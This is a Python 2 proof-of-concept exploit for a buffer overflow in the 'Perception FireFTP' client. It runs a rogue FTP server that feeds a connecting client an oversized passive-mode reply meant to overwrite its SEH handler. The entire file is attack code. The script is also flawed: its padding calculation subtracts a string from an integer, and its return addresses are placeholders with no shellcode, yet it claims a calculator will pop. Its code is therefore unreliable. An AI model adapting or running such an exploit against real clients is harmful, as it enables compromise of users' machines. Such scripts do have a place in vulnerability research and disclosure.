#!/usr/bin/python

from socket import *
import struct
import time

total = 40000
junk = "\x41" * 19
nseh = "CCCC"
seh = "BBBB"
sisa = "D" * len(total-(junk+nseh+seh))

payload = junk+nseh+seh+sisa

host = "0.0.0.0"
port = 21

s = socket(AF_INET, SOCK_STREAM)
s.bind((host, port))
s.listen(1)

print "\n[+] Perception FireFTP Buffer Overflow POC"
print "[+] by modpr0be[at]spentera[dot]com."
print "============================================="
print "[+] Evil FTP Server Started."
print "[+] Listening on %d ..." % port

cl, addr = s.accept()
print "[+] Connection accepted from %s" % addr[0]
print "[+] Whatever for username and password."

def hajar():
	welcome = "220 Welcome to EvilFTP Server\r\n"
	cl.send(welcome)
	cl.recv(1024)
	cl.send("331 User name okay, need password\r\n")	# received USER
	cl.recv(1024)
	cl.send("230-Password accepted\r\n")			# received PASS
	cl.send("230 User logged in.\r\n")
	cl.recv(1024)
	cl.send("257 \"/\" is current directory\r\n")		# received from PWD
	cl.recv(1024)
	cl.send("200 Type set to I\r\n")			# received from TYPE A
	cl.recv(1024)
	cl.send("227 Entering Passive Mode (10,211,55,2,193,174)\r\n")	# received from passive mode
	cl.recv(1024)
	cl.send("150 Here comes the directory listing.\r\n")	# received from LIST
	cl.send("226 Directory send ok.\r\n")
	cl.recv(1024)
	cl.send("250 CWD Command successful.\r\n")
	cl.recv(1024)
	cl.send("257 \"/\" is current directory\r\n")	# received from PWD
	cl.recv(1024)
	cl.send("200 Type set to I\r\n")	# received from TYPE I
	cl.recv(1024)
	print "[+] Begin sending evil passive mode.."
	cl.send("227 Entering Passive Mode ("+payload+",1,1,1,1,1)\r\n")	# this is the junk from passive mode
	cl.recv(1024)
	cl.close() 

hajar()
time.sleep(3)
print "[+] Skadush! Calculator will pop out..\r\n" 

s.close()
